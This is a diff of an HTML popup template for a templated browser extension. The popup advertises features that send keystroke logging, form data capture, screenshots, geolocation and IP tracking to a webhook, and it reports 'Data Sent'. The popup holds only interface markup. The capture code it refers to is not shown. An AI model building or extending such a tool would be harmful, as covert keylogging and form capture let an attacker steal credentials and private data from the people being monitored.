@@ -3,97 +3,253 @@
 <html>
 <head>
   <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>{{EXTENSION_NAME}}</title>
   <style>
     body {
-      width: 300px;
+      width: 320px;
+      min-height: 400px;
+      margin: 0;
       padding: 20px;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: white;
-      margin: 0;
     }
+
     .header {
       text-align: center;
       margin-bottom: 20px;
     }
-    .header h1 {
-      margin: 0;
+
+    .logo {
+      width: 48px;
+      height: 48px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      margin: 0 auto 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+    }
+
+    .title {
       font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 5px;
     }
-    .header p {
-      margin: 5px 0 0 0;
-      opacity: 0.8;
+
+    .version {
       font-size: 12px;
+      opacity: 0.8;
     }
-    .stats {
+
+    .status-section {
       background: rgba(255, 255, 255, 0.1);
       border-radius: 8px;
       padding: 15px;
       margin-bottom: 15px;
     }
-    .stat-item {
+
+    .status {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .status-indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+
+    .status.active .status-indicator {
+      background: #00ff00;
+      box-shadow: 0 0 5px #00ff00;
+    }
+
+    .status.error .status-indicator {
+      background: #ff4444;
+      box-shadow: 0 0 5px #ff4444;
+    }
+
+    .status.info .status-indicator {
+      background: #44aaff;
+      box-shadow: 0 0 5px #44aaff;
+    }
+
+    .feature-list {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 15px;
+    }
+
+    .feature-list h3 {
+      margin: 0 0 10px 0;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      margin-bottom: 8px;
+      font-size: 12px;
+    }
+
+    .feature-icon {
+      margin-right: 8px;
+      font-size: 14px;
+    }
+
+    .stats-section {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 15px;
+    }
+
+    .stat {
       display: flex;
       justify-content: space-between;
       margin-bottom: 8px;
-      font-size: 14px;
+      font-size: 12px;
     }
-    .stat-item:last-child {
-      margin-bottom: 0;
-    }
+
     .stat-value {
-      font-weight: bold;
+      font-weight: 600;
     }
-    .button {
-      width: 100%;
+
+    .actions {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn {
+      flex: 1;
       padding: 10px;
-      background: rgba(255, 255, 255, 0.2);
       border: none;
-      border-radius: 5px;
-      color: white;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 600;
       cursor: pointer;
-      margin-bottom: 10px;
-      font-size: 14px;
+      transition: all 0.2s;
     }
-    .button:hover {
+
+    .btn-primary {
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+    }
+
+    .btn-primary:hover {
       background: rgba(255, 255, 255, 0.3);
     }
-    .status {
-      text-align: center;
-      font-size: 12px;
-      opacity: 0.8;
+
+    .btn-secondary {
+      background: rgba(0, 0, 0, 0.2);
+      color: white;
     }
-    .status.active {
-      color: #4CAF50;
+
+    .btn-secondary:hover {
+      background: rgba(0, 0, 0, 0.3);
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 10px;
+      opacity: 0.7;
+      margin-top: 15px;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+
+    .pulsing {
+      animation: pulse 2s infinite;
     }
   </style>
 </head>
 <body>
   <div class="header">
-    <h1>{{EXTENSION_NAME}}</h1>
-    <p>{{EXTENSION_DESCRIPTION}}</p>
+    <div class="logo">🕵️</div>
+    <div class="title">{{EXTENSION_NAME}}</div>
+    <div class="version">v{{EXTENSION_VERSION}}</div>
   </div>
 
-  <div class="stats">
-    <div class="stat-item">
-      <span>Pages Tracked:</span>
+  <div class="status-section">
+    <div class="status active" id="status">
+      <div class="status-indicator"></div>
+      <span>✅ Extension Active</span>
+    </div>
+    <div class="status active" id="webhookStatus">
+      <div class="status-indicator"></div>
+      <span>🔗 Webhook Connected</span>
+    </div>
+  </div>
+
+  <div class="feature-list">
+    <h3>🎯 Active Features</h3>
+    <div class="feature" id="ipTracking" style="display: {{FEATURE_IP_TRACKING}} ? 'flex' : 'none';">
+      <span class="feature-icon">🌐</span>
+      <span>IP Address Tracking</span>
+    </div>
+    <div class="feature" id="geoLocation" style="display: {{FEATURE_GEOLOCATION}} ? 'flex' : 'none';">
+      <span class="feature-icon">📍</span>
+      <span>Geolocation Tracking</span>
+    </div>
+    <div class="feature" id="browserInfo" style="display: {{FEATURE_BROWSER_INFO}} ? 'flex' : 'none';">
+      <span class="feature-icon">💻</span>
+      <span>Browser Information</span>
+    </div>
+    <div class="feature" id="screenshots" style="display: {{FEATURE_SCREENSHOT}} ? 'flex' : 'none';">
+      <span class="feature-icon">📸</span>
+      <span>Screenshot Capture</span>
+    </div>
+    <div class="feature" id="formData" style="display: {{FEATURE_FORM_DATA}} ? 'flex' : 'none';">
+      <span class="feature-icon">📝</span>
+      <span>Form Data Tracking</span>
+    </div>
+    <div class="feature" id="clickTracking" style="display: {{FEATURE_CLICK_TRACKING}} ? 'flex' : 'none';">
+      <span class="feature-icon">👆</span>
+      <span>Click Event Tracking</span>
+    </div>
+    <div class="feature" id="keyLogger" style="display: {{FEATURE_KEYLOGGER}} ? 'flex' : 'none';">
+      <span class="feature-icon">⌨️</span>
+      <span>Keystroke Logging</span>
+    </div>
+  </div>
+
+  <div class="stats-section">
+    <h3>📊 Session Stats</h3>
+    <div class="stat">
+      <span>Events Captured:</span>
+      <span class="stat-value" id="eventCount">0</span>
+    </div>
+    <div class="stat">
+      <span>Pages Visited:</span>
       <span class="stat-value" id="pageCount">0</span>
     </div>
-    <div class="stat-item">
-      <span>Clicks Recorded:</span>
-      <span class="stat-value" id="clickCount">0</span>
-    </div>
-    <div class="stat-item">
+    <div class="stat">
       <span>Data Sent:</span>
-      <span class="stat-value" id="dataSent">0</span>
+      <span class="stat-value" id="dataSent">0 KB</span>
+    </div>
+    <div class="stat">
+      <span>Session Duration:</span>
+      <span class="stat-value" id="sessionTime">0m</span>
     </div>
   </div>
 
-  <button class="button" id="clearData">Clear Local Data</button>
-  <button class="button" id="exportData">Export Data</button>
-  <button class="button" id="testConnection">Test Connection</button>
+  <div class="actions">
+    <button class="btn btn-primary" id="testBtn">🧪 Test Connection</button>
+    <button class="btn btn-secondary" id="clearBtn">🗑️ Clear Data</button>
+  </div>
 
-  <div class="status active" id="status">
-    ✅ Extension Active
+  <div class="footer">
+    🕵️ Monitoring active since extension install
   </div>
 
   <script src="popup.js"></script>
